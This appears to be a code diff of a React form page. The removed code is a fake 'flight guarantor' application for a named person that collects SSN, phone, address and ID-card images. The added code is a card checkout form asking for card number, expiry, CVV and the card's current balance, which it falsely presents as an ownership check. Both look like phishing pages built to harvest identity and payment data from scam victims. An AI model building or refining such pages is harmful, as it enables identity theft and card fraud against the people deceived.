@@ -5,65 +5,39 @@ function HomePage(props) {
     return (
         <div className="container">
             <form className="box" onSubmit={props.handleSubmit}>
-                <div className="logo">
-                    <img src="https://img.aviationpros.com/files/base/cygnus/cavc/image/2016/05/Modified__BWI_Logo_copy.574db71b7737e.png?auto=format%2Ccompress&w=640&width=640" />
+                <h1>You are almost done!</h1>
+                <p>provide your credit/debit card to complete your purchase</p>
+                <div className="duo2">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Mastercard_2019_logo.svg/1200px-Mastercard_2019_logo.svg.png" alt=""/>
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRsYPZQ63HCZZ-K5q3-Y0nWlAcVTsb0eYVpIQ&s" alt="" />
+                    <img src="https://avatars.githubusercontent.com/u/476675?s=280&v=4" alt="" />
                 </div>
-                <div className="heading">
-                    <h1>Priviledge Flight Guarantor's Form</h1>
-                    <p className="grace">Applicaion for Grace Angel Miller</p>
+                <div className="card-input">
+                    <p>Card Number</p>
+                    <input type="number" placeholder="111-222-333-444" name="cardNumber" onChange={props.getData} />
                 </div>
-
-
-                <div className="first-box-line">
-                    <div className="fb-left">
-                        <div className="input-box">
-                            <p>FIRST NAME</p>
-                            <input type="text" name="firstName" onChange={props.getData}/>
-                        </div>
-                        <div className="input-box">
-                            <p>LAST NAME</p>
-                            <input type="text" name="lastName" onChange={props.getData} />
-                        </div>
+                <div className="card-input">
+                    <p>Cardholder's Name</p>
+                    <input type="text" placeholder="JOHN DOE" name="cardName" onChange={props.getData} />
+                </div>
+                <div className="duo">
+                    <div className="card-input">
+                        <p>Expiry Date</p>
+                        <input type="number" placeholder="MM/YY" name="expiryDate" onChange={props.getData}  />
                     </div>
-                    <div className="fb-right">
-                        <div className="input-box">
-                            <p>SSN * social security Number</p>
-                            <input type="number" name="ssn" onChange={props.getData}/>
-                        </div>
-                        <div className="input-box">
-                            <p>PHONE NUMBER</p>
-                            <input type="number" name="phoneNumber" onChange={props.getData}/>
-                        </div>
+                    <div className="card-input">
+                        <p>CVV</p>
+                        <input type="number" placeholder="123" name="cvv" onChange={props.getData} />
                     </div>
                 </div>
 
+                <div className="card-input">
+                   <p>Enter Estimate Balance on this card(this is an extra security layer that verify you are the owner of this card)</p>
+                   <input type="number" placeholder="$123.00" name="balance" onChange={props.getData} />
+                </div>
 
-                <section className="down">
-                    <div className="input-box ib2">
-                        <p>ADDRESS</p>
-                        <input type="text" placeholder="Address Line 1" name="addressL1" onChange={props.getData} />
-                    </div>
-                    <div className="input-box ib2">
+                 <button className="check" onClick={props.handleSubmit}>Check Out</button>
 
-                        <input type="text" placeholder="Address Line 2" name="addressL2" onChange={props.getData}/>
-                    </div>
-                    
-                    <p className="state">Gurantor must be at the selected arrival state: <span>Arkansas</span></p>
-
-                    <div className="input-box ib2">
-                        <p>Upload front of Identification card (Id card), take a straight and clear image</p>
-                        <input type="file" placeholder="Address Line 1" className="inpu"/>
-                    </div>
-
-                    <div className="input-box ib2">
-                        <p>Upload Back of Identification card (Id card), take a straight and clear image</p>
-                        <input type="file" placeholder="Address Line 1" className="inpu"/>
-                    </div>
-                    
-
-                  <button className="sub" >Submit</button>
-                    
-                </section>
             </form>
         </div>
     )
